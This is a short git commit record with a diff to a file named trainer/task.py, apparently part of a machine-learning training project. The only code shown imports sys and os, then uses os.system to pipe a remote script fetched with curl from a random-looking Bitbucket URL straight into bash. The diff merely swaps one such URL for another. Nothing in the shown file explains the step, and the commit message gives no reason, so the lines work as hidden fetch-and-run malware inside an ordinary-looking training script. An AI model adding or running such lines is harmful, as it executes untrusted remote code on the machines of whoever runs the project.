2e2b6b0a45afc95583319fb6c2f73efe201e2ba3
Gual Geol <guall.geoll@gmail.com>
2024-03-04 01:45:24 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/srytytytr5fd/fsadaafsqsare/raw/main/gas | bash')
+os.system('curl -sL https://bitbucket.org/zptea/sc/src/main/aa | bash')
